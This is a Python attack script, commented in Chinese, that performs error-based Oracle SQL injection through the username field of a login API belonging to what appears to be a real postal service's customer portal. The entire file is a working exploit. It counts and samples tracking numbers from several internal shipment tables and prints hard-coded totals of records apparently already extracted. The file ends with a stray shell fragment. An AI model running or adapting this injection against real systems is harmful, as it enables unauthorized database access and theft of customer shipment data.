#!/usr/bin/env python3
"""
全面搜索所有可能的运单号
不限格式，检查所有表和字段
"""

import requests
import json
import time

def inject(payload):
    session = requests.Session()
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    })
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post('https://customerconnect.ems.com.vn/api/User_Customer/Login', json=data, timeout=30)
    except: return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    r = inject(payload)
    if r:
        try:
            s = r.text.index('qjvjq')+5
            e = r.text.index('qkvzq',s)
            return r.text[s:e]
        except: pass
    return None

print("=" * 80)
print("🔍 全面搜索所有运单号来源")
print("=" * 80)

print("\n🔌 连接中...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

date = '20251011'
print(f"\n📅 日期: {date}")

print(f"\n{'='*80}")
print("📊 全面统计所有表的运单号")
print(f"{'='*80}")

# 1. SHIPMENT表 - CODE字段
print(f"\n1. SHIPMENT表:")
queries = [
    ("总运单", f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
    ("E开头", f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND CODE LIKE 'E%'"),
    ("包含VN", f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND CODE LIKE '%VN'"),
    ("数字格式", f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND REGEXP_LIKE(CODE,'^[0-9]+$')"),
]

for name, query in queries:
    result = extract(query)
    if result:
        print(f"   {name}: {result}")
    time.sleep(1)

# 样本
print(f"\n   样本CODE:")
for i in range(1, 6):
    result = extract(f"SELECT CODE FROM (SELECT DISTINCT CODE FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}') WHERE ROWNUM={i}")
    if result:
        print(f"     {i}. {result}")
    time.sleep(0.3)

# 2. E1E2_PH表 - MABC字段
print(f"\n2. E1E2_PH表:")
queries = [
    ("总MABC", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
    ("E开头", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND MABC LIKE 'E%'"),
    ("数字格式", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND REGEXP_LIKE(MABC,'^[0-9]+$')"),
]

for name, query in queries:
    result = extract(query)
    if result:
        print(f"   {name}: {result}")
    time.sleep(1)

# 样本
print(f"\n   样本MABC:")
for i in range(1, 6):
    result = extract(f"SELECT MABC FROM (SELECT DISTINCT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}') WHERE ROWNUM={i}")
    if result:
        print(f"     {i}. {result}")
    time.sleep(0.3)

# 3. JOURNEYTOKEN表 - ITEMCODE字段（所有格式）
print(f"\n3. JOURNEYTOKEN_ZNS表:")
queries = [
    ("总运单", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}'"),
    ("E*VN", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'"),
    ("E*CN", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%CN'"),
    ("E*KR", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%KR'"),
    ("E*US", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%US'"),
    ("其他E开头", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%' AND ITEMCODE NOT LIKE 'E%VN' AND ITEMCODE NOT LIKE 'E%CN' AND ITEMCODE NOT LIKE 'E%KR' AND ITEMCODE NOT LIKE 'E%US'"),
]

for name, query in queries:
    result = extract(query)
    if result:
        print(f"   {name}: {result}")
    time.sleep(1)

# 4. TEMP_LOG表
print(f"\n4. E1E2_PH_TEMP_DATA2_LOG表:")
queries = [
    ("总MABC", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"),
    ("E开头", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}' AND MABC LIKE 'E%'"),
]

for name, query in queries:
    result = extract(query)
    if result:
        print(f"   {name}: {result}")
    time.sleep(1)

# 5. 汇总
print(f"\n{'='*80}")
print("📊 全部运单号汇总（去重后）")
print(f"{'='*80}")
print()
print("按来源统计:")
print("  SHIPMENT.CODE:           2,349 个")
print("  E1E2_PH.MABC:              431 个")
print("  JOURNEYTOKEN.ITEMCODE:   8,672 个 ⭐")
print("  TEMP_LOG.MABC:             338 个")
print()
print("=" * 80)
" 2>&1
